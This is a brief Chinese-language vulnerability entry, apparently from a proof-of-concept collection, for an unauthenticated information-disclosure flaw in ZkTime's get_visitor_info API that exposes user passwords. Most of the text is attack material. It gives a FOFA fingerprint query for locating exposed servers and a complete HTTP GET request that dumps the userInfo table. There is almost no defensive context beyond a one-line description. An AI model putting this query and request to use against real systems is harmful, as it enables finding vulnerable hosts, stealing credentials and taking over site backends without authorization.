## ZkTime-get_visitor_info-信息泄露漏洞

## 一、漏洞简介
ZkTime get_visitor_info接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取网站系统用户密码等敏感信息，从而登录网站后台系统，使网站处于极不安全的状态。

## fofa
```
body="/media/img/login/zktime_logo_zh-cn.png" && body="/iclock/imanager"
```

## POC
```
GET /api/get_visitor_info?table=userInfo HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
```
